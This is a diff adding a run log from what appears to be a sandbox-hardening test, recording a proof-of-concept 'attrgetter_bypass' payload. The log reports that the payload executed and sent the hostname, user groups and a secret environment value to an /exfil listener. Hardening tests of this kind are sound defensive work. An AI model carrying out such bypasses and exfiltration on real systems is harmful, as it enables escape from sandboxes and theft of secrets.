@@ -1,0 +1,10 @@
+[2026-11-22T10:08:22Z] START A_attrgetter_bypass src=A pure=poc.attrgetter_bypass.v1 payload=payloads/attrgetter_bypass.py port=8922
+[*] src=/tmp/opencode/julep-hard/A
+[*] pure=poc.attrgetter_bypass.v1 bundle=4bf7426cb9656caa03083aa22aa4197798b7315e75c12aba7d29b5f20fd1b2b9 signer=2152f8d19b791d24453242e15f2eab6cb7cffa7b6a5ed30097960e069881db12
+[*] registered tier=native_venv
+[listener] POST /exfil 430 bytes
+[+] exfil proof sha256=8c7acb68a5cf54241c72007a27a863d3682b912cf4860064937ab1708e6e149f
+[*] return value: {"exfiltrated": true, "proof": {"cwd": "/tmp/opencode/julep-hard", "hostname": "kali-original", "marker": "JULEP-HARDENING-PROOF-9b1e7c", "pid": 8373, "secret_env": "sk-live-hardening-secret-3a7d2", "uid": "uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),107(bluetooth),124(lpadmin),132(wireshark),134(kaboxer),135(vboxsf),982(ollama)"}}
+[*] elapsed=0.07s
+PROBE_RESULT {"proof": {"cwd": "/tmp/opencode/julep-hard", "hostname": "kali-original", "marker": "JULEP-HARDENING-PROOF-9b1e7c", "pid": 8373, "secret_env": "sk-live-hardening-secret-3a7d2", "uid": "uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),107(bluetooth),124(lpadmin),132(wireshark),134(kaboxer),135(vboxsf),982(ollama)"}, "proof_sha256": "8c7acb68a5cf54241c72007a27a863d3682b912cf4860064937ab1708e6e149f", "result": "EXECUTED", "value": {"exfiltrated": true, "proof": {"cwd": "/tmp/opencode/julep-hard", "hostname": "kali-original", "marker": "JULEP-HARDENING-PROOF-9b1e7c", "pid": 8373, "secret_env": "sk-live-hardening-secret-3a7d2", "uid": "uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),107(bluetooth),124(lpadmin),132(wireshark),134(kaboxer),135(vboxsf),982(ollama)"}}}
+[2026-11-22T10:08:23Z] END A_attrgetter_bypass rc=0
